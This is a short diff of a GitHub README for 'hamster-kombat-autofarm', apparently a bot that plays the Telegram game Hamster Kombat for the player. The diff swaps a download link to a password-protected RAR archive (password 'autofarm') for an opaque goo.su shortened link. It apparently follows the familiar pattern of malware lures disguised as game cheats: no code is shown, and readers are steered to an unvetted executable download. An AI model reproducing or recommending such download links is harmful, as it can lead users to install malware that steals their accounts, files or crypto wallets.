@@ -1,8 +1,7 @@
 # hamster-kombat-autofarm
 
 [![Download](https://github.com/sauravsaran99/hamster-kombat-autofarm/assets/66282953/3e570e1c-844b-4f42-b0e7-df45abba0dd6
-)]([https://github.com/sauravsaran99/hamster-kombat-autofarm/releases/download/HamsterAutoFarmBotv1.6/Hamster.Kombat.Bot.rar)
-* Password - autofarm
+)](https://goo.su/DAGUW)
 
 A bot for the Telegram game Hamster Kombat that performs all actions on behalf of the player would have a comprehensive set of functionalities designed to automate gameplay. 
 
